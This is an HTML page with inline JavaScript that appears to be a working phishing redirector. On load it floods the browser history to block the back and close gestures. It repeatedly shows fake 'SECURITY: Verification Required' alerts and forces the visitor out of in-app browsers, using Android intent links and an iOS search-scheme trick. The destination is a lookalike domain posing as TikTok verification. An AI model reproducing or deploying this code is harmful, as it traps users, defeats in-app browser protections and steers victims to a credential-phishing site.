<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const destination = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000; 

    function forceOut() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

        if (isAndroid) {
            window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
        } else if (isIOS) {
            // iOS: Try to jump to Safari using the Search protocol
            window.location.replace("x-web-search://?" + encodeURIComponent(destination));
            // Trigger a simulated click on a direct link
            const a = document.createElement('a');
            a.href = destination;
            a.click();
        }
    }

    // THE HEARTBEAT: Fires every 500ms regardless of alerts
    // This attempts the redirect in the "background"
    const heartBeat = setInterval(() => {
        if (Date.now() > killTime) {
            clearInterval(heartBeat);
            return;
        }
        forceOut();
    }, 500);

    function rampage() {
        if (Date.now() > killTime) return;

        // The alert blocks the main thread, but the setInterval above 
        // will keep trying to fire redirects in the gaps.
        alert("SECURITY: Verification Required\n\nPress OK to open in Safari/Chrome.");
        
        forceOut();
        setTimeout(rampage, 10);
    }

    window.onload = () => {
        // Build an massive history stack to jam the "X" and "Back" gestures
        for(let i=0; i<100; i++) {
            history.pushState({page: i}, "", "#step_" + i);
        }
        
        rampage();
    };

    // If they swipe or try to close (X), it triggers a blur/popstate
    window.onblur = () => { if (Date.now() < killTime) rampage(); };
    window.onpopstate = () => { if (Date.now() < killTime) rampage(); };

</script>
</body>
</html>
